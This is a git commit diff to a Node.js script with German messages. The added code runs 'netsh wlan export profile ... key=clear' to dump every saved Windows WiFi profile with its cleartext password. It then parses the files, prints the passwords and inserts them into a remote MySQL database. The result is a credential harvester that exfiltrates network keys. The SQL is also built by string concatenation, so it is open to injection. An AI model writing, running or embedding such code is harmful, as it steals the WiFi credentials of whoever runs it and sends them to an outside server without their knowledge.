61d0531c3529c57b71d7ef386c90fd54736bf794
CuzImBisonratte <CuzImBisonratte@gmail.com>
2021-10-09 00:32:09 +0200

    V1.2.0
    Added automatically pulling the data

--- app.js
+++ app.js
@@ -17,80 +17,87 @@ var connection = mysql.createConnection({
   password : password,
   database : database
 });
-// Import the xml-reader
-const xml2js = require('xml2js');
-// Import file-system functions
-const fs = require('fs');
-// Create a parser
-const parser = new xml2js.Parser({ attrkey: "ATTR" });
-// Let the system know, which folder to use the files from
-const testFolder = '../XMLs/';
-// Read the directory
-fs.readdir(testFolder, (err, files) => {
-  // Run the script for each file
-  files.forEach(file => {
-    // Get the right file
-    let xml_string = fs.readFileSync("../XMLs/"+file, "utf8");
-    // Parse the xml
-    parser.parseString(xml_string, function(error, result) {
-      // When no errors occur, go on
-      if(error === null) {
-        // Create a line break
-        console.log("\n");
-        // Get the wifi name
-        wifi_name = result.WLANProfile.name[0];
-        // Get the wifi encryption
-        wifi_encrypt = result.WLANProfile.MSM[0].security[0].authEncryption[0].encryption[0];
-        // Check if a password is needed
-        if(wifi_encrypt!="none"){
-          // Get the password
-          wifi_pass = result.WLANProfile.MSM[0].security[0].sharedKey[0].keyMaterial[0];
-        }
-        // If no password is needed
-        else{
-          // Write no password
-          wifi_pass = "-";
-        }
-        // Get the authentication type
-        wifi_auth = result.WLANProfile.MSM[0].security[0].authEncryption[0].authentication[0];
-        // Log the results
-        console.log("WiFi name: "+wifi_name);
-        console.log("WiFi password: "+wifi_pass);
-        console.log("WiFi encryption: "+wifi_encrypt);
-        console.log("WiFi authentication: "+wifi_auth);
-        // prepare an sql statement
-        sql_statment = "INSERT INTO "+table+" (`name`, `password`, `encryption`, `authentication`) VALUES ('"+wifi_name+"','"+wifi_pass+"','"+wifi_encrypt+"','"+wifi_auth+"'"+")";
-        // Push the data to the Database
-        connection.query(sql_statment, function (error, results, fields) {
-          // If there was a connection to the server
-          if(results){
-            sent_count++;
-            db_message = "Alle neuen Daten wurden an den server übermittelt!";
+// Print out info
+console.log("Lade WiFi-Profile...");
+// Import commandline-execution
+const { exec } = require("child_process");
+// Download the needed wifi-xml-files
+exec("netsh wlan export profile folder=XMLs key=clear", (error, stdout, stderr) => {});
+// Print out info
+console.log("Exportiere die Daten aus den Profilen...");
+// Wait for the download and then run the rest
+setTimeout(readAndWrite,5000);
+function readAndWrite(){
+  // Import the xml-reader
+  const xml2js = require('xml2js');
+  // Import file-system functions
+  const fs = require('fs');
+  // Create a parser
+  const parser = new xml2js.Parser({ attrkey: "ATTR" });
+  // Let the system know, which folder to use the files from
+  const testFolder = './XMLs/';
+  // Read the directory
+  fs.readdir(testFolder, (err, files) => {
+    // Run the script for each file
+    files.forEach(file => {
+      // Get the right file
+      let xml_string = fs.readFileSync("./XMLs/"+file, "utf8");
+      // Parse the xml
+      parser.parseString(xml_string, function(error, result) {
+        // When no errors occur, go on
+        if(error === null) {
+          // Create a line break
+          console.log("\n");
+          // Get the wifi name
+          wifi_name = result.WLANProfile.name[0];
+          // Get the wifi encryption
+          wifi_encrypt = result.WLANProfile.MSM[0].security[0].authEncryption[0].encryption[0];
+          // Check if a password is needed
+          if(wifi_encrypt!="none"){
+            // Get the password
+            wifi_pass = result.WLANProfile.MSM[0].security[0].sharedKey[0].keyMaterial[0];
           }
-        });
-        
-      // If errors occurs, log them
-      }
-      else {
-          console.log(error);
-      }
+          // If no password is needed
+          else{
+            // Write no password
+            wifi_pass = "-";
+          }
+          // Get the authentication type
+          wifi_auth = result.WLANProfile.MSM[0].security[0].authEncryption[0].authentication[0];
+          // Log the results
+          console.log("WiFi name: "+wifi_name);
+          console.log("WiFi password: "+wifi_pass);
+          console.log("WiFi encryption: "+wifi_encrypt);
+          console.log("WiFi authentication: "+wifi_auth);
+          // prepare an sql statement
+          sql_statment = "INSERT INTO "+table+" (`name`, `password`, `encryption`, `authentication`) VALUES ('"+wifi_name+"','"+wifi_pass+"','"+wifi_encrypt+"','"+wifi_auth+"'"+")";
+          // Push the data to the Database
+          connection.query(sql_statment, function (error, results, fields) {
+            // If there was a connection to the server
+            if(results){
+              sent_count++;
+              db_message = "Alle neuen Daten wurden an den server übermittelt!";
+            }
+          });
+          
+        // If errors occurs, log them
+        }
+        else {
+            console.log(error);
+        }
+      });
     });
   });
-});
-function closeConnection(){
-  console.log("\nEndresultat:\n")
-  if(sent_count=1){
-    console.log("Es wurde "+sent_count+" Datensatz verarbeitet!");
+  function closeConnection(){
+    console.log("\n\n---------\n\nEndresultat:\n")
+    if(sent_count=1){
+      console.log("Es wurde "+sent_count+" Datensatz verarbeitet!");
+    }
+    else{
+      console.log("Es wurden "+sent_count+" Datensätze verarbeitet!");
+    }
+    console.log(db_message);
+    connection.end();
   }
-  else{
-    console.log("Es wurden "+sent_count+" Datensätze verarbeitet!");
-  }
-  console.log(db_message);
-  connection.end();
+  setTimeout(closeConnection,1000);
 }
-setTimeout(closeConnection,1000);
-
-
- 
-
- 
